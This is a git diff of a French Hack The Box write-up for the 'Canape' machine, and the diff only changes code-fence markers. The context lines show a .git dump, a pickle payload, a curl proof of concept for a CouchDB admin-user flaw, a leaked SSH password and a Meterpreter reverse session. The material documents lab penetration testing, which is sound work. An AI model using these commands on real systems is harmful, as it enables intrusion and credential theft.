@@ -14,7 +14,7 @@ Bienvenue à Springfield
 
 Voici le résultat (très allégé pour conserver l'utile) d'un scan Nmap avec l'option *--script safe* :  
 
-```plain
+```
 Nmap scan report for 10.10.10.70
 Not shown: 65533 filtered ports
 PORT      STATE SERVICE VERSION
@@ -78,7 +78,7 @@ Pour le reste le site web présent est un fan site des Simpsons qui collecte les
 
 Ni une ni deux on récupère le dépôt Git à l'aide de [dvcs-ripper](https://github.com/kost/dvcs-ripper) :  
 
-```plain
+```
 perl rip-git.pl -v -u http://10.10.10.70:80/.git/
 ```
 
@@ -175,7 +175,7 @@ On trouve des projets tout fait pour générer des payloads prêts à l'emploi c
 
 Cet outil demande qu'on lui passe un script Python qui sera ainsi sérialisé. A titre d'exemple la transformation de l'instruction *print("hello world")* génère le pickle suivant :  
 
-```plain
+```
 ctypes
 FunctionType
 (cmarshal
@@ -260,7 +260,7 @@ On aura préalablement généré une backdoor via *msfvenom* (lors de la premiè
 
 On obtient alors un shell en tant que *www-data*. Le module *exploit\_suggester* de Metasploit nous remonte un exploit potentiel mais ça s'avère être un faux positif :  
 
-```plain
+```
 [*] 10.10.10.70 - Collecting local exploits for x64/linux...
 [*] 10.10.10.70 - 20 exploit checks are being tried...
 [+] 10.10.10.70 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
@@ -278,7 +278,7 @@ Si on cherche ses fichiers sur le système on voit qu'il possède tout */var/www
 
 Et pour cause, on voit dans les process qu'il fait tourner *CouchDB* ainsi que d'autres process *Erlang* :  
 
-```plain
+```
 homer       668  0.8  3.5 651424 35336 ?        Sl   04:32   0:23 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
 homer       679  0.0  0.0  26304   228 ?        S    04:32   0:00 /home/homer/bin/../erts-7.3/bin/epmd -daemon
 homer       786  0.0  0.0   4504   736 ?        Ss   04:32   0:00 sh -s disksup
@@ -289,7 +289,7 @@ homer      3591  0.0  0.8  44788  8040 ?        Ssl  04:57   0:00 ./bin/couchjs 
 
 Vu que l'on ne voit rien d'autre côté disque, on jette un œil au *CouchDB* qui écoute en local. On peut commencer [par cette documentation sur 1and1](https://www.1and1.com/cloud-community/learn/database/couchdb/working-with-couchdb-from-the-command-line/) pour avoir quelques commandes et infos sur ce système de base NoSQL.  
 
-```plain
+```
 $ curl http://127.0.0.1:5984
 {"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
 $ curl http://127.0.0.1:5984/_all_dbs
@@ -301,7 +301,7 @@ $ curl http://127.0.0.1:5984/_users/_all_docs
 
 Plutôt que de s’embêter avec curl on peut profiter de notre session Meterpreter pour forwarder le port en local :  
 
-```plain
+```
 meterpreter > portfwd add -l 5984 -p 5984 -r 127.0.0.1
 [*] Local TCP relay created: :5984 <-> 127.0.0.1:5984
 ```
@@ -316,13 +316,13 @@ Cette version de *CouchDB* est vulnérable [à un exploit](https://justi.cz/secu
 
 On reprend le PoC curl pour créer notre compte privilégié :  
 
-```plain
+```
 curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:devloop' --data-binary '{"type": "user", "name": "devloop", "roles": ["_admin"], "roles": [], "password": "devloop31337"}'
 ```
 
 On peut dès lors accéder aux bases dont l’accès nous été auparavant refusé :  
 
-```plain
+```
 $ curl http://127.0.0.1:5984/_users/_all_docs --basic -u devloop:devloop31337
 {"total_rows":7,"offset":0,"rows":[
 {"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},
@@ -352,7 +352,7 @@ Une fois activée, c'est mieux :')
 
 ![HTB Canape Couchdb ssh password](/assets/img/htb/canape_passwords.png)
 
-```plain
+```
   "item": "ssh",
   "password": "0B4jyA0xtytZi7esBNGp",
   "user": ""
@@ -401,7 +401,7 @@ No files/directories in /home/homer/.devloop/mypackage (from PKG-INFO)
 
 Et pendant ce temps là, à une demi-heure de route de chez *Léonard de Vinci* :  
 
-```plain
+```
 msf exploit(multi/handler) > [*] Sending stage (816260 bytes) to 10.10.10.70
 [*] Meterpreter session 4 opened (10.10.14.13:443 -> 10.10.10.70:34618) at 2018-08-27 14:45:20 +0200
 msf exploit(multi/handler) > sessions -i 4
